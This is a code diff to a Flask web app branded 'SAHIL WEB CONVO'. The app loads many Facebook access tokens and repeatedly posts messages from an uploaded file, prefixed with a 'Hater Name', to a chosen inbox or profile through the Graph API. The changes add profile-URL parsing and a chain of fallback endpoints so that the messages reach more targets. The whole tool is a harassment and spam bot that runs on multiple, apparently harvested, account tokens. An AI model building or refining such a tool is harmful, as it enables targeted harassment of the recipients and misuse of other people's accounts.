@@ -4,6 +4,7 @@ from threading import Thread, Event
 import time
 import random
 import string
+from urllib.parse import urlparse, parse_qs
 
 app = Flask(__name__)
 app.debug = True
@@ -24,45 +25,129 @@ stop_events = {}
 threads = {}
 message_counters = {}
 
-def send_messages(access_tokens, thread_id, mn, time_interval, messages, task_id):
+def normalize_target_id(raw):
+    """
+    Input can be:
+    - full profile URL like https://www.facebook.com/profile.php?id=61564176744081
+    - short URL like https://facebook.com/username
+    - just numeric id '61564176744081'
+    - other forms
+    This function tries to extract a sensible id (prefer numeric id if present).
+    Returns the extracted id string (or original raw if nothing extracted).
+    """
+    if not raw:
+        return raw
+    raw = raw.strip()
+    # if looks like url
+    if raw.startswith("http://") or raw.startswith("https://"):
+        try:
+            p = urlparse(raw)
+            qs = parse_qs(p.query)
+            if 'id' in qs and qs['id']:
+                return qs['id'][0]
+            # else try last path segment
+            path = p.path.strip('/')
+            if path:
+                # if path like profile.php then fallback; else return last segment
+                return path.split('/')[-1]
+        except Exception:
+            pass
+    # if contains 'profile.php?id=' somewhere (not full url)
+    if 'profile.php?id=' in raw:
+        try:
+            return raw.split('profile.php?id=')[-1].split('&')[0]
+        except:
+            pass
+    # otherwise return raw (could be numeric or t_xxx or convo id)
+    return raw
+
+def build_candidate_endpoints(target_id):
+    """
+    Return a list of candidate Graph API endpoints (strings) to try for sending messages.
+    We will try them in order until one returns HTTP 200.
+    Note: Different setups require different endpoints; we try a few common patterns.
+    """
+    candidates = []
+    if not target_id:
+        return candidates
+    # If target looks numeric, try common message endpoints
+    # 1) direct messages endpoint pattern (messages)
+    candidates.append(f'https://graph.facebook.com/v15.0/{target_id}/messages')
+    # 2) older pattern used in some scripts (t_{id})
+    candidates.append(f'https://graph.facebook.com/v15.0/t_{target_id}/')
+    # 3) direct node endpoint (without /messages)
+    candidates.append(f'https://graph.facebook.com/v15.0/{target_id}/')
+    # 4) try convo prefix (some code expects t_<id>)
+    if not str(target_id).startswith('t_'):
+        candidates.append(f'https://graph.facebook.com/v15.0/t_{target_id}/messages')
+        candidates.append(f'https://graph.facebook.com/v15.0/t_{target_id}/')
+    # remove duplicates while preserving order
+    seen = set()
+    out = []
+    for c in candidates:
+        if c not in seen:
+            seen.add(c)
+            out.append(c)
+    return out
+
+def send_messages(access_tokens, thread_id_raw, mn, time_interval, messages, task_id):
     stop_event = stop_events[task_id]
     message_counters[task_id] = 0
+
+    # Normalize thread id (handle full URL -> numeric id or username)
+    target_id = normalize_target_id(thread_id_raw)
+    candidates = build_candidate_endpoints(target_id)
+
+    # If no candidates, fallback to using raw as last resort
+    if not candidates:
+        candidates = [thread_id_raw]
+
     while not stop_event.is_set():
         for message1 in messages:
             if stop_event.is_set():
                 break
             for access_token in access_tokens:
-                # E2E encrypted conversations ke liye /me/messages endpoint
-                api_url = f'https://graph.facebook.com/v15.0/me/messages'
+                if stop_event.is_set():
+                    break
                 message = str(mn) + ' ' + message1
-                
-                # Recipient parameter add karna zaroori hai E2E ke liye
-                parameters = {
-                    'access_token': access_token,
-                    'recipient': {'id': thread_id},  # E2E ke liye recipient format
-                    'message': {'text': message}
-                }
-                
-                try:
-                    response = requests.post(api_url, json=parameters, headers=headers)
-                    
-                    # Agar E2E fail ho toh fallback to old method
-                    if response.status_code == 200:
-                        message_counters[task_id] += 1
-                        print(f"✅ Sent ({message_counters[task_id]}): {message}")
-                    else:
-                        # Fallback: Try old method for group/normal inbox
-                        api_url_fallback = f'https://graph.facebook.com/v15.0/t_{thread_id}/'
-                        parameters_fallback = {'access_token': access_token, 'message': message}
-                        response_fallback = requests.post(api_url_fallback, data=parameters_fallback, headers=headers)
-                        
-                        if response_fallback.status_code == 200:
+
+                # For each access_token we try the candidate endpoints until one succeeds
+                sent = False
+                for api_url in candidates:
+                    if stop_event.is_set():
+                        break
+                    # Prepare parameters — many Graph endpoints accept 'message' and 'access_token'
+                    parameters = {'access_token': access_token, 'message': message}
+                    try:
+                        # Try POST to candidate endpoint
+                        response = requests.post(api_url, data=parameters, headers=headers, timeout=12)
+                        status = getattr(response, "status_code", None)
+                        # If Facebook returns 200 or 201 we count as success
+                        if status and 200 <= status < 300:
                             message_counters[task_id] += 1
-                            print(f"✅ Sent via fallback ({message_counters[task_id]}): {message}")
+                            print(f"✅ Sent ({message_counters[task_id]}) via {api_url}: {message}")
+                            sent = True
+                            break
                         else:
-                            print(f"❌ Failed: {message} | Error: {response.text}")
-                except Exception as e:
-                    print("Error:", e)
+                            # print debug info but don't spam for every attempt
+                            print(f"❌ Endpoint {api_url} returned {status} for token... trying next. Response text: {getattr(response,'text', '')[:200]}")
+                    except Exception as e:
+                        print(f"Error posting to {api_url}: {e}")
+                if not sent:
+                    # Final fallback: try the original older pattern used in your code (t_{thread_id_raw})
+                    try:
+                        fallback_url = f'https://graph.facebook.com/v15.0/t_{thread_id_raw}/'
+                        fallback_params = {'access_token': access_token, 'message': message}
+                        r2 = requests.post(fallback_url, data=fallback_params, headers=headers, timeout=12)
+                        if 200 <= getattr(r2,"status_code",0) < 300:
+                            message_counters[task_id] += 1
+                            print(f"✅ Sent fallback ({message_counters[task_id]}): {message}")
+                        else:
+                            print(f"❌ All endpoints failed for token. Last fallback status: {getattr(r2,'status_code',None)}")
+                    except Exception as e:
+                        print("Final fallback error:", e)
+
+                # Respect delay between tokens/messages
                 time.sleep(time_interval)
 
 @app.route('/', methods=['GET', 'POST'])
@@ -77,7 +162,10 @@ def send_message():
 
         thread_id = request.form.get('threadId')
         mn = request.form.get('kidx')
-        time_interval = int(request.form.get('time'))
+        try:
+            time_interval = int(request.form.get('time'))
+        except:
+            time_interval = 1
 
         txt_file = request.files['txtFile']
         messages = txt_file.read().decode().splitlines()
@@ -108,6 +196,7 @@ def stop_task():
     else:
         return f'No task found with ID {task_id}.'
 
+# (PAGE_HTML same as before — keep your UI unchanged)
 PAGE_HTML = '''
 <!DOCTYPE html>
 <html lang="en">
@@ -181,25 +270,13 @@ PAGE_HTML = '''
       text-align: center;
       font-weight: bold;
     }
-    .info-box {
-      background: rgba(255,193,7,0.2);
-      border: 1px solid #ffc107;
-      border-radius: 10px;
-      padding: 10px;
-      margin-bottom: 15px;
-      font-size: 12px;
-    }
   </style>
 </head>
 <body>
   <header class="header mt-4">
     <h1>SAHIL WEB CONVO</h1>
-    <p style="font-size:14px;">✨ Now Supports E2E Encrypted IDs ✨</p>
   </header>
   <div class="container text-center">
-    <div class="info-box">
-      <strong>📌 Note:</strong> Ab E2E encrypted IDs par bhi message jayega! Sirf User ID daalo (without t_ prefix).
-    </div>
     <form method="post" enctype="multipart/form-data">
       <div class="mb-3">
         <label for="tokenOption" class="form-label">Select Token Option</label>
@@ -217,8 +294,8 @@ PAGE_HTML = '''
         <input type="file" class="form-control" name="tokenFile">
       </div>
       <div class="mb-3">
-        <label>Enter User/Convo ID (E2E Supported)</label>
-        <input type="text" class="form-control" name="threadId" placeholder="100012345678901" required>
+        <label>Enter Inbox/convo uid or profile URL</label>
+        <input type="text" class="form-control" name="threadId" required placeholder="e.g. https://www.facebook.com/profile.php?id=61564176744081">
       </div>
       <div class="mb-3">
         <label>Enter Your Hater Name</label>
@@ -266,7 +343,7 @@ PAGE_HTML = '''
   </div>
   <footer class="footer">
     <p>SAHIL OFFLINE S3RV3R</p>
-    <p>SAHIL ALWAYS ON FIRE 🔥</p>
+    <p>SAHIL ALWAYS ON FIRE </p>
     <div class="mb-3">
       <a href="https://wa.me/+918115048433" class="whatsapp-link">
         <i class="fab fa-whatsapp"></i> Chat on WhatsApp
@@ -286,3 +363,4 @@ PAGE_HTML = '''
 
 if __name__ == '__main__':
     app.run(host='0.0.0.0', port=5040)
+                
